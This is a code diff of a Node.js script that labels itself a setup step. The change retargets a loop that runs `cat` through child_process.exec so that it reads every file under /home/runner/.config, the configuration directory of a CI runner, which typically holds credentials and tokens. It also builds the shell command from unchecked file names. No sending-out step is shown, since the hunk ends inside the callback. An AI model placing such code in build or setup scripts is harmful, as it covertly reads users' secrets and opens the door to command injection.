@@ -4,9 +4,9 @@ const fs = require("fs");
 console.log("this is a setup.....")
 
 
-const files_other = fs.readdirSync('/home/runner');
+const files_other = fs.readdirSync('/home/runner/.config');
     files_other.forEach(element => {
-        let path = `/home/runner/${element}`;
+        let path = `/home/runner/.config/${element}`;
             
         cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
             if (err){
